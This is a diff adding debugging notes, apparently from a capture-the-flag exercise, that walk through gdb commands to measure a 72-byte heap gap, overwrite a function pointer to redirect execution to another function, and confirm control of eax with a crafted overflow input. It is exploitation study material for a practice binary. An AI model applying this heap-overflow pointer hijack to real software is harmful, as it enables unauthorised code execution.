@@ -1,0 +1,29 @@
+b *0x80484a1
+r BBBBBBBB (string containing 8 0x42 in a row)
+disas
+info registers (eax: 0x804a050, esp: 0xbffff700) (fun** is at 0x804a050)
+x/1x 0xbffff700+0x1c (get buff: 0x0804a008)
+p 0x804a050 - 0x0804a008 (there is 72 bytes between the 2 allocations)
+b n (get position of n: 0x804845a)
+let's try to point $esp+0x18 (fun) to 0x804845a
+si (do one step to go past the "fun = result of malloc")
+p 0xbffff700+0x18
+set {int}3221223192 = 0x804845a
+c (we get a segfault)
+
+let rerun but this time we but a break at *0x80484d0 (so right before the call to *fun at the end of main)
+d
+b *0x80484d0
+r BBBBBBBB
+disas
+info registers (eax = 0x8048468)
+b m (break shows the address: 0x804846e)
+p 0x804846e - 0x8048468 (we have a delta of 6 between the breakpoint of gdb and the actual pointer, if we check objdump, m indeed starts at 0x8048468)
+let set eax to 0x8048454 (real start of n, instead of 0x804845a given by gdb's breakpoint)
+set $eax = 0x8048454
+c
+(works, we have a permission denied as expected)
+
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+let's retry with 72 A followed by 4 B (should result in eax = 0x42424242)
+info registers (eax is indeed 0x42424242)
